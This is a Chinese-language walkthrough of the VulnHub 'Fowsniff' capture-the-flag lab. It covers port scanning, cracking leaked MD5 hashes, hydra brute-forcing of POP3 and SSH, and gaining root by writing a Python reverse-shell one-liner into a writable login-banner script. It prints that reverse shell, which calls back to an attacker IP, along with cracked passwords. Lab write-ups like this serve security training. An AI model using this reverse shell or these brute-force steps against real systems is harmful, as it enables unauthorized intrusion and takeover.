# Fowsniff主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/fowsniff-1,262/
- 下载地址：https://download.vulnhub.com/fowsniff/Fowsniff_CTF_ova.7z



## 信息收集：

### 主机发现

- 当前主机IP段：`192.168.0.1/24`,当前主机IP：`192.168.0.204`

- ```shell
  └─$ sudo nmap -sn 192.168.0.1/24 --min-rate 10000
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 22:42 EDT
  Nmap scan report for 192.168.0.1
  Host is up (0.00054s latency).
  MAC Address: 9C:53:22:4A:FC:25 (Unknown)
  Nmap scan report for 192.168.0.246
  Host is up (0.00041s latency).
  MAC Address: 08:00:27:69:11:E3 (Oracle VirtualBox virtual NIC)
  Nmap scan report for 192.168.0.204
  Host is up.
  Nmap done: 256 IP addresses (9 hosts up) scanned in 22.47 seconds
  ```



### 端口扫描

- TCP扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.0.246 -oA Nmap-scan/sT 
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 23:33 EDT
  Nmap scan report for 192.168.0.246
  Host is up (0.0029s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  110/tcp open  pop3
  143/tcp open  imap
  MAC Address: 08:00:27:69:11:E3 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
  ```

- UDP扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.0.246 -oA Nmap-scan/sU
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 23:34 EDT
  Warning: 192.168.0.246 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.0.246
  Host is up (0.00050s latency).
  All 65535 scanned ports on 192.168.0.246 are in ignored states.
  Not shown: 65379 open|filtered udp ports (no-response), 156 closed udp ports (port-unreach)
  MAC Address: 08:00:27:69:11:E3 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 161.90 seconds
  ```



### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80,110,143 -oA Nmap-scan/sC -v 192.168.0.246
  Nmap scan report for 192.168.0.246
  Host is up (0.00056s latency).
  
  PORT    STATE SERVICE VERSION
  22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
  |   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
  |_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)
  80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Fowsniff Corp - Delivering Solutions
  | http-robots.txt: 1 disallowed entry 
  |_/
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  110/tcp open  pop3    Dovecot pop3d
  |_pop3-capabilities: USER SASL(PLAIN) AUTH-RESP-CODE PIPELINING UIDL TOP CAPA RESP-CODES
  143/tcp open  imap    Dovecot imapd
  |_imap-capabilities: Pre-login IDLE listed IMAP4rev1 LITERAL+ have LOGIN-REFERRALS ENABLE post-login ID OK SASL-IR AUTH=PLAINA0001 capabilities more
  MAC Address: 08:00:27:69:11:E3 (Oracle VirtualBox virtual NIC)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
  OS details: Linux 3.2 - 4.9
  Uptime guess: 0.038 days (since Fri Aug 18 22:44:14 2023)
  Network Distance: 1 hop
  TCP Sequence Prediction: Difficulty=260 (Good luck!)
  IP ID Sequence Generation: All zeros
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Read data files from: /usr/bin/../share/nmap
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Fri Aug 18 23:39:09 2023 -- 1 IP address (1 host up) scanned in 19.88 seconds
  
  ```



### 基础漏洞扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80,111,143 192.168.0.246 -oA Nmap-scan/Script 
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 23:42 EDT
  Pre-scan script results:
  | broadcast-avahi-dos: 
  |   Discovered hosts:
  |     224.0.0.251
  |   After NULL UDP avahi packet DoS (CVE-2011-1002).
  |   Hosts that seem down (vulnerable):
  |_    224.0.0.251
  Nmap scan report for 192.168.0.246
  Host is up (0.00068s latency).
  
  PORT    STATE  SERVICE
  22/tcp  open   ssh
  80/tcp  open   http
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       http://ha.ckers.org/slowloris/
  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  | http-enum: 
  |   /robots.txt: Robots file
  |   /README.txt: Interesting, a readme.
  |_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  | http-internal-ip-disclosure: 
  |_  Internal IP Leaked: 127.0.1.1
  111/tcp closed rpcbind
  143/tcp open   imap
  MAC Address: 08:00:27:69:11:E3 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 364.28 seconds
  ```



## web信息收集：

- 根据页面信息找到对应的[twitter-->点我](https://twitter.com/FowsniffCorp)
- ![image-20230819140846204](https://raw.githubusercontent.com/r0o983/images/main/202308191408701.png)
- ![image-20230819140909595](https://raw.githubusercontent.com/r0o983/images/main/202308191409788.png)
- ![image-20230819140934857](https://raw.githubusercontent.com/r0o983/images/main/202308191409923.png)
- 找到对应的泄露文件，将信息存储在本地为之后的密码碰撞做准备。
- ![image-20230819141412544](https://raw.githubusercontent.com/r0o983/images/main/202308191414638.png)

### hashcat 破解

- ```shell
  └─$ sudo hashcat -a 0 -m 0  passcrask  /usr/share/wordlists/rockyou.txt 
  hashcat (v6.2.6) starting
  
  OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
  ==================================================================================================================================================
  * Device #1: pthread-penryn-Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz, 2914/5892 MB (1024 MB allocatable), 4MCU
  
  Dictionary cache built:
  * Filename..: /usr/share/wordlists/rockyou.txt
  * Passwords.: 14344392
  * Bytes.....: 139921507
  * Keyspace..: 14344385
  * Runtime...: 1 sec
  
  90dc16d47114aa13671c697fd506cf26:scoobydoo2               
  4d6e42f56e127803285a0a7649b5ab11:orlando12                
  1dc352435fecca338acfd4be10984009:apples01                 
  19f5af754c31f1e2651edde9250d69bb:skyler22                 
  8a28a94a588a95b80163709ab4313aa4:mailcall                 
  f7fd98d380735e859f8b2ffbbede5a7e:07011972                 
  0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever                
  ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101                 
  Approaching final keyspace - workload adjusted.           
  
                                                            
  Session..........: hashcat
  Status...........: Exhausted
  Hash.Mode........: 0 (MD5)
  Hash.Target......: passcrask
  Time.Started.....: Sat Aug 19 02:35:19 2023 (7 secs)
  Time.Estimated...: Sat Aug 19 02:35:26 2023 (0 secs)
  Kernel.Feature...: Pure Kernel
  Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
  Guess.Queue......: 1/1 (100.00%)
  Speed.#1.........:  2021.3 kH/s (0.18ms) @ Accel:512 Loops:1 Thr:1 Vec:4
  Recovered........: 8/9 (88.89%) Digests (total), 8/9 (88.89%) Digests (new)
  Progress.........: 14344385/14344385 (100.00%)
  Rejected.........: 0/14344385 (0.00%)
  Restore.Point....: 14344385/14344385 (100.00%)
  Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
  Candidate.Engine.: Device Generator
  Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
  Hardware.Mon.#1..: Util: 27%
  
  Started: Sat Aug 19 02:34:53 2023
  Stopped: Sat Aug 19 02:35:27 2023
  ```



### 使用crackmapexec来进行暴力爆破ssh

- `crackmapexec ssh 192.168.0.246 -u user -p passcrask --continue-on-success`

  - 参数：ssh 指定协议
  - -u 指定用户名文件
  - -p 指定密码文件
  - -continue-on-success 如果碰撞出了密码，则继续碰撞，不会暂停

- ```shell
  └─$ crackmapexec ssh 192.168.0.246 -u user -p passcrask --continue-on-success
  SSH         192.168.0.246   22     192.168.0.246    [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:8a28a94a588a95b80163709ab4313aa4 Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:ae1644dac5b77c0cf51e0d26ad6d7e56 Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:1dc352435fecca338acfd4be10984009 Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:19f5af754c31f1e2651edde9250d69bb Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:90dc16d47114aa13671c697fd506cf26 Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:a92b8a29ef1183192e3d35187e0cfabd Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:0e9588cb62f4b6f27e33d449e2ba0b3b Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:4d6e42f56e127803285a0a7649b5ab11 Authentication failed.
  SSH         192.168.0.246   22     192.168.0.246    [-] mauer:f7fd98d380735e859f8b2ffbbede5a7e Authentication failed.
  ```

- 碰撞结束后并未发现有效登录信息，尝试收集其他信息.

### gobuster 扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.0.246/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,jsp,php,rar,zip,tar
  [sudo] password for kali: 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.0.246/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              rar,zip,tar,txt,jsp,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 315] [--> http://192.168.0.246/images/]
  /security.txt         (Status: 200) [Size: 459]
  /assets               (Status: 301) [Size: 315] [--> http://192.168.0.246/assets/]
  /README.txt           (Status: 200) [Size: 1288]
  /robots.txt           (Status: 200) [Size: 26]
  /LICENSE.txt          (Status: 200) [Size: 17128]
  /server-status        (Status: 403) [Size: 301]
  Progress: 1543920 / 1543927 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```



### 使用hydra爆破pop3

- `hydra -L user -P passcrashed pop3://192.168.0.246:110`
- 成功获取用户名及密码:`seina:scoobydoo2`

#### 使用nc连接邮箱

- Ps:关于pop3命令此处有简要说明:[点我](https://www.winmail.cn/technic_pop3.php)

- 参数: 

  - (user 用户名)
  - (pass 密码)
  - list --> 展示邮件列表
  - (retr 数字) 显示第几封邮件内容

- **邮件正文**

- ```sh
  └─$ nc 192.168.0.246 110
  +OK Welcome to the Fowsniff Corporate Mail Server!
  user seina
  +OK
  pass scoobydoo2
  +OK Logged in.
  stat
  +OK 2 2902
  list
  +OK 2 messages:
  1 1622
  2 1280
  .
  retr 1
  +OK 1622 octets
  Return-Path: <stone@fowsniff>
  X-Original-To: seina@fowsniff
  Delivered-To: seina@fowsniff
  Received: by fowsniff (Postfix, from userid 1000)
          id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
  To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
      mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
      tegel@fowsniff
  Subject: URGENT! Security EVENT!
  Message-Id: <20180313185107.0FA3916A@fowsniff>
  Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
  From: stone@fowsniff (stone)
  
  Dear All,
  
  A few days ago, a malicious actor was able to gain entry to
  our internal email systems. The attacker was able to exploit
  incorrectly filtered escape characters within our SQL database
  to access our login credentials. Both the SQL and authentication
  system used legacy methods that had not been updated in some time.
  
  We have been instructed to perform a complete internal system
  overhaul. While the main systems are "in the shop," we have
  moved to this isolated, temporary server that has minimal
  functionality.
  
  This server is capable of sending and receiving emails, but only
  locally. That means you can only send emails to other users, not
  to the world wide web. You can, however, access this system via 
  the SSH protocol.
  
  The temporary password for SSH is "S1ck3nBluff+secureshell"
  
  You MUST change this password as soon as possible, and you will do so under my
  guidance. I saw the leak the attacker posted online, and I must say that your
  passwords were not very secure.
  
  Come see me in my office at your earliest convenience and we'll set it up.
  
  Thanks,
  A.J Stone
  
  
  .
  retr 2
  +OK 1280 octets
  Return-Path: <baksteen@fowsniff>
  X-Original-To: seina@fowsniff
  Delivered-To: seina@fowsniff
  Received: by fowsniff (Postfix, from userid 1004)
          id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
  To: seina@fowsniff
  Subject: You missed out!
  Message-Id: <20180313185405.101CA1AC2@fowsniff>
  Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
  From: baksteen@fowsniff
  
  Devin,
  
  You should have seen the brass lay into AJ today!
  We are going to be talking about this one for a looooong time hahaha.
  Who knew the regional manager had been in the navy? She was swearing like a sailor!
  
  I don't know what kind of pneumonia or something you brought back with
  you from your camping trip, but I think I'm coming down with it myself.
  How long have you been gone - a week?
  Next time you're going to get sick and miss the managerial blowout of the century,
  at least keep it to yourself!
  
  I'm going to head home early and eat some chicken soup. 
  I think I just got an email from Stone, too, but it's probably just some
  "Let me explain the tone of my meeting with management" face-saving mail.
  I'll read it when I get back.
  
  Feel better,
  
  Skyler
  
  PS: Make sure you change your email password. 
  AJ had been telling us to do that right before Captain Profanity showed up.
  
  .
  -ERR Disconnected for inactivity.
  
  ```

- 关于邮件正文中提到,目前用户的默认ssh密码为:`S1ck3nBluff+secureshell`

- 再次使用hydra来进行ssh爆破,由于已知用户名,这里直接指定密码.

- ```shell
  └─$ hydra -L user -p S1ck3nBluff+secureshell  ssh://192.168.0.246 -f
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-19 04:39:52
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
  [DATA] attacking ssh://192.168.0.246:22/
  [22][ssh] host: 192.168.0.246   login: baksteen   password: S1ck3nBluff+secureshell
  [STATUS] attack finished for 192.168.0.246 (valid pair found)
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-19 04:39:52
  
  ```

- 未知有多少用户在使用默认密码,所以这里加上参数`-f`,如果爆破出了密码则继续爆破,可能多个用户的权限不一致



### 获得初始shell

- 使用`hydra`爆破出的账号密码登录系统

- ```shell
  └─$ ssh baksteen@192.168.0.246
  The authenticity of host '192.168.0.246 (192.168.0.246)' can't be established.
  ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '192.168.0.246' (ED25519) to the list of known hosts.
  baksteen@192.168.0.246's password: 
  
                              _____                       _  __  __  
        :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
     :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
  .sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
  -:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
  -:      y.      dssssssso                ____                      
  -:      y.      dssssssso               / ___|___  _ __ _ __        
  -:      y.      dssssssso              | |   / _ \| '__| '_ \     
  -:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
  -:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
  -:    .+mdddddddmyyyyyhy:                              |_|        
  -: -odMMMMMMMMMMmhhdy/.    
  .ohdddddddddddddho:                  Delivering Solutions
  
  
     ****  Welcome to the Fowsniff Corporate Server! **** 
  
                ---------- NOTICE: ----------
  
   * Due to the recent security breach, we are running on a very minimal system.
   * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
  
  
  New release '18.04.6 LTS' available.
  Run 'do-release-upgrade' to upgrade to it.
  
  Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
  baksteen@fowsniff:~$ id
  uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
  baksteen@fowsniff:~$ uname -a
  Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  baksteen@fowsniff:~$ whoami
  baksteen
  baksteen@fowsniff:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 08:00:27:69:11:e3 brd ff:ff:ff:ff:ff:ff
      inet 192.168.0.246/24 brd 192.168.0.255 scope global enp0s3
         valid_lft forever preferred_lft forever
      inet6 ::a00:27ff:fe69:11e3/64 scope global mngtmpaddr dynamic 
         valid_lft 296sec preferred_lft 296sec
      inet6 fe80::a00:27ff:fe69:11e3/64 scope link 
         valid_lft forever preferred_lft forever
  
  ```

## 提权

- 通过查找当前用户组可写文件进行提权-->`find / -group users -type f 2>/dev/null -not -path "/proc/*" -not -path "/sys/*"` 信息过多,使用`-not -path`来进行过滤掉看似不太可能利用的文件

- ```shell
  baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null -not -path "/proc/*" -not -path "/sys/*"
  /opt/cube/cube.sh
  /home/baksteen/.cache/motd.legal-displayed
  /home/baksteen/Maildir/dovecot-uidvalidity
  /home/baksteen/Maildir/dovecot.index.log
  /home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
  /home/baksteen/Maildir/dovecot-uidlist
  /home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
  /home/baksteen/.viminfo
  /home/baksteen/.bash_history
  /home/baksteen/.lesshsQ
  /home/baksteen/.bash_logout
  /home/baksteen/term.txt
  /home/baksteen/.profile
  /home/baksteen/.bashrc
  ```

- 查看`/opt/cube/cube.sh`文件内容,发现内容为纯文本,应该是登陆时显示的`banner`信息,但是却是以`.sh`文件为结尾.尝试修改进行提权操作

- 写入python3的反弹shell尝试提权

- ```shell
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.204",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
  ```

- 本地开启监听等待连接:  --> 成功获得root权限

- ```shell
  └─$ sudo nc -nvlp 9001
  listening on [any] 9001 ...
  connect to [192.168.0.204] from (UNKNOWN) [192.168.0.246] 42758
  # whoami
  whoami
  root
  # uname -a
  uname -a
  Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  # id
  id
  uid=0(root) gid=0(root) groups=0(root)
  # ip a
  ip a                                                                         
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1                                                                    
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo                                        
         valid_lft forever preferred_lft forever                             
      inet6 ::1/128 scope host                                                
         valid_lft forever preferred_lft forever                                 
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000                                                    
      link/ether 08:00:27:69:11:e3 brd ff:ff:ff:ff:ff:ff                     
      inet 192.168.0.246/24 brd 192.168.0.255 scope global enp0s3                
         valid_lft forever preferred_lft forever                             
      inet6 ::a00:27ff:fe69:11e3/64 scope global mngtmpaddr dynamic          
         valid_lft 299sec preferred_lft 299sec                                 
      inet6 fe80::a00:27ff:fe69:11e3/64 scope link                             
         valid_lft forever preferred_lft forever                                
  # cd /root                                                               
  cd /root                                                                     
  # ls                                                                        
  ls                                                                           
  Maildir  flag.txt                                                         
  # ls -lhai                                                                
  ls -lhai                                                                    
  total 28K
    383 drwx------  4 root root 4.0K Mar  9  2018 .
      2 drwxr-xr-x 22 root root 4.0K Mar  9  2018 ..                          
  49691 -rw-r--r--  1 root root 3.1K Mar  9  2018 .bashrc                    
  49695 drwxr-xr-x  2 root root 4.0K Mar  9  2018 .nano                      
    407 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
  49355 drwx------  5 root root 4.0K Mar  9  2018 Maildir
  49739 -rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
  # cat flag.txt
  cat flag.txt
     ___                        _        _      _   _             _ 
    / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
   | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
    \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
                 |___/ 
  
   (_)
    |--------------
    |&&&&&&&&&&&&&&|
    |    R O O T   |
    |    F L A G   |
    |&&&&&&&&&&&&&&|
    |--------------
    |
    |
    |
    |
    |
    |
   ---
  Nice work!
  This CTF was built with love in every byte by @berzerk0 on Twitter.
  Special thanks to psf, @nbulischeck and the whole Fofao Team.
  # 
  ```

- 
